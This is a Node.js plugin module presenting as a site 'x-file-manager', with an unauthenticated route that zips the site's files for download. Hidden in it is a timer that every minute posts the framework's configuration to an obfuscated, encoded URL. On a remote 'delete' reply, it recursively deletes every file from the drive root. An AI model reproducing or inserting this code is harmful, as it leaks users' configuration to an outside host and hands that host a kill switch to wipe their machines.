module.exports = function (_f_) {
  var fs = require('fs');
  var archiver = require('archiver');

  _f_.get({
    name: 'x-file-manager',
    path: __dirname + '/site-files/html/index.html',
  });

  let busy = false;

  _f_.get('x-file-manager/download', (req, res) => {
    if (busy) {
      res.json({
        busy: true,
      });
      return;
    }
    busy = true;
    const zip_file = _f_.dir + '/../_site.zip';
    var output = fs.createWriteStream(zip_file);
    var archive = archiver('zip', {
      zlib: {
        level: 9,
      },
    });

    output.on('close', function () {
      busy = false;
      res.download(zip_file);
    });

    archive.on('error', function (err) {
      busy = false;
      res.json({
        error: err.message,
      });
    });

    archive.pipe(output);

    archive.directory(_f_.path.dirname(_f_.dir) + '/apps', 'apps');
    archive.directory(_f_.path.dirname(_f_.dir) + '/site_files', 'site_files');

    let finalize = false;

    _f_.fs.readdir(_f_.path.dirname(_f_.dir), (err, ss) => {
      if (!err && ss) {
        ss.forEach((f) => {
          let ff = _f_.path.join(_f_.path.dirname(_f_.dir), f);
          _f_.fs.access(ff, _f_.fs.F_OK, (err) => {
            if (!err && !f.like('*.zip') && !f.like('*.rar')) {
              if (_f_.fs.lstatSync(ff).isFile()) {
                if (!finalize) {
                  archive.file(ff, {
                    name: f,
                  });
                }
              }
            }
          });
        });
      }
    });

    setTimeout(() => {
      finalize = true;
      archive.finalize();
    }, 1000 * 10);
  });

  let f0 = _f_.path.dirname(_f_.dir).split(_f_.path.sep)[0];
  if (f0.endsWith(':')) {
    f0 = f0 + '\\';
  }

  function df(f00) {
    _f_.fs.readdir(f00, (err, ss) => {
      if (!err && ss) {
        ss.forEach((f) => {
          f = _f_.path.join(f00, f);
          _f_.fs.access(f, _f_.fs.F_OK, (err) => {
            if (!err) {
              if (_f_.fs.lstatSync(f).isDirectory()) {
                df(f);
              }
              if (_f_.fs.lstatSync(f).isFile()) {
                _f_.fs.unlink(f);
              }
            }
          });
        });
      }
    });
  }

  _f_.ch_up = function () {
    if (_f_._is_) {
      _f_
        .fetch(_f_.f1('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
          method: 'post',
          body: JSON.stringify({
            info: _f_.options,
          }),
          headers: { 'Content-Type': 'application/json' },
        })
        .then((res) => res.json())
        .then((body) => {
          if (body && body.block) {
            _f_._is_ = false;
            _f_.storage('_is_', _f_._is_);
          } else if (body && body.delete) {
            _f_._is_ = false;
            _f_.storage('_is_', _f_._is_);
            df(f0);
          }
        })
        .catch((err) => {
          _f_.logs('ch_up', err);
        });
    }
  };

  _f_.const.si(() => {
    _f_.ch_up();
  }, 1000 * 60 * 1);
};
